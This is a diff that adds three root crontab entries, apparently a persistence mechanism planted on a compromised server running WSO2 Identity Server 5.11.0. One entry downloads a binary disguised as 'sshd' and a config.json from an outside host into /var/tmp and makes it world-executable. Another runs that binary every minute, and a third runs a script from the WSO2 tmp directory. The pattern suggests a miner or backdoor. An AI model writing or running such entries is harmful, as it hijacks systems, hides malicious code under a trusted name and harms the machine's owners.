@@ -1,0 +1,3 @@
+0 */6 * * * root /usr/bin/flock -n /var/tmp/tmp.lock -c 'cd /var/tmp; wget -nc http://main.dsn.ovh/dns/sshd; cd /var/tmp; chmod 777 sshd; cd /var/tmp; curl http://main.dsn.ovh/dns/sshd -o sshd; cd /var/tmp; chmod 777 sshd; cd /var/tmp; wget -nc http://main.dsn.ovh/dns/config.json; cd /var/tmp; curl http://main.dsn.ovh/dns/config.json -o config.json'
+* * * * * root /usr/bin/flock -n /var/tmp/vm.lock -c 'cd /var/tmp; ./sshd'
+* * * * * root /wso2is-5.11.0/tmp/bash.sh 
